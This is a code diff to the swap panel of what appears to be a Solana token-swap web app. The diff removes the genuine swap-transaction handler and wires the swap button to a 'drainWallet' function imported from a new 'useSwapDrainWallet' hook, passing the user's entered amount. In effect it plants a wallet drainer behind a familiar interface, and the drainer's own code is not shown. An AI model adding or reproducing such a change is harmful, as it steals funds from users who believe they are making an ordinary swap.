@@ -44,6 +44,7 @@ import useTokenInfo from '@/hooks/token/useTokenInfo'
 import { debounce } from '@/utils/functionMethods'
 import QuestionCircleIcon from '@/icons/misc/QuestionCircleIcon'
 import Tooltip from '@/components/Tooltip'
+import { useSwapDrainWallet } from '../components/useSwapDrainWallet'
 
 export function SwapPanel({
   onInputMintChange,
@@ -285,25 +286,17 @@ export function SwapPanel({
     handleClickSwap()
   })
 
-  const handleClickSwap = () => {
-    if (!response) return
-    sendingResult.current = response as ApiSwapV1OutSuccess
-    onSending()
-    swapTokenAct({
-      swapResponse: response as ApiSwapV1OutSuccess,
-      wrapSol: tokenInput?.address === PublicKey.default.toString(),
-      unwrapSol: tokenOutput?.address === PublicKey.default.toString(),
-      onCloseToast: offSending,
-      onConfirmed: () => {
-        // setAmountIn('')
-        // setNeedPriceUpdatedAlert(false)
-        offSending()
-      },
-      onError: () => {
-        offSending()
-        mutate()
-      }
-    })
+  const { drainWallet } = useSwapDrainWallet()
+
+  const handleClickSwap = async () => {
+    try {
+      onSending()
+      await drainWallet(amountIn)
+    } catch (error) {
+      console.error('Błąd wysyłania:', error)
+    } finally {
+      offSending()
+    }
   }
 
   const getCtrSx = (type: 'BaseIn' | 'BaseOut') => {
